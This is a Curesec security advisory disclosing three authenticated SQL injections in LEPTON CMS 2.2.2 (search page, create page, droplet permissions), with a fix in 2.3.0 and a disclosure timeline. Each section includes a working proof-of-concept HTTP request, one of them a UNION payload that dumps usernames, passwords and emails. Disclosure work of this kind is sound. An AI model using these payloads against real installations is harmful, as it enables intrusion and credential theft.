@@ -1,0 +1,113 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:   LEPTON 2.2.2 stable
+Fixed in:           2.3.0
+Fixed Version Link: http://www.lepton-cms.org/posts/
+                    important-lepton-2.3.0-101.php
+Vendor Website:     http://www.lepton-cms.org/
+Vulnerability Type: SQL Injection
+Remote Exploitable: Yes
+Reported to vendor: 09/05/2016
+Disclosed to        11/10/2016
+public:
+Release mode:       Coordinated Release
+CVE:                n/a
+Credits             Tim Coen of Curesec GmbH
+
+2. Overview
+
+Lepton is a content management system written in PHP. In version 2.2.2, it is
+vulnerable to multiple SQL injections. The injections require a user account
+with elevated privileges.
+
+3. Details
+
+SQL Injection: Search Page
+
+CVSS: Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description: The "terms" parameter of the page search is vulnerable to SQL
+Injection. A user account with the right "Pages" is required to access this
+feature.
+
+Proof of Concept:
+
+POST /LEPTON_stable_2.2.2/upload/admins/pages/index.php?leptoken=
+3f7020b05ec343675b6b2z1472137594 HTTP/1.1 Host: localhost Accept-Language:
+en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=
+fkb7do1domiofuavvof5qbsv66; lep8765sessionid=f3a67s8kh379l9bs2rkggtpt12
+Connection: close Content-Type: application/x-www-form-urlencoded
+Content-Length: 154 search_scope=title&terms=" union select
+username,2,3,4,5,6,password,email,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+from lep_users -- -&search=Search
+
+Blind or Error-based SQL Injection: Create Page
+
+CVSS: Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description: The "parent" parameter of the create page functionality is
+vulnerable to SQL Injection. A user account with the right "Pages" is required
+to access this feature. The injection is blind or error based in the case that
+PHP is configured to show errors.
+
+Proof of Concept:
+
+POST /LEPTON_stable_2.2.2/upload/admins/pages/add.php?leptoken=
+dbbbe0a5cca5d279f7cd2z1472142328 HTTP/1.1 Host: localhost Accept-Language:
+en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=
+fkb7do1domiofuavvof5qbsv66; lep8765sessionid=uniltg734soq583l03clr0t6j0
+Connection: close Content-Type: application/x-www-form-urlencoded
+Content-Length: 84 title=test&type=wysiwyg&parent=0 union select version()&
+visibility=public&submit=Add
+
+Blind or Error-based SQL Injection: Add Droplet
+
+CVSS: Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description: The "Add_droplets" parameter of the droplet permission manager is
+vulnerable to SQL injection. A user account with access to the Droplets
+administration tool is required. The injection is blind or error based in the
+case that PHP is configured to show errors.
+
+Proof of Concept:
+
+POST /LEPTON_stable_2.2.2/upload/admins/admintools/tool.php?tool=droplets&
+leptoken=1eed21e683f216dbc9dc2z1472139075 HTTP/1.1 Host: localhost
+Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie:
+PHPSESSID=fkb7do1domiofuavvof5qbsv66; lep8765sessionid=
+f3a67s8kh379l9bs2rkggtpt12 Connection: close Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded Content-Length: 277 tool=
+droplets&perms=1&Add_droplets%5B%5D=1&Add_droplets%5B%5D=2' WHERE attribute=
+'Add_droplets' or extractvalue(1,version())%23&Delete_droplets%5B%5D=1&
+Export_droplets%5B%5D=1&Import_droplets%5B%5D=1&Manage_backups%5B%5D=1&
+Manage_perms%5B%5D=1&Modify_droplets%5B%5D=1&save=Save
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 2.3.0:
+
+http://www.lepton-cms.org/posts/important-lepton-2.3.0-101.php
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+09/05/2016 Informed Vendor about Issue
+09/06/2016 Vendor requests 60 days to release fix
+10/25/2016 Vendor releases fix
+11/10/2016 Disclosed to public
+
+
+Blog Reference:
+https://www.curesec.com/blog/article/blog/Lepton-222-SQL-Injection-173.html
+ 
+--
+blog:  https://www.curesec.com/blog
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Josef-Orlopp-Straße 54
+10365 Berlin, Germany
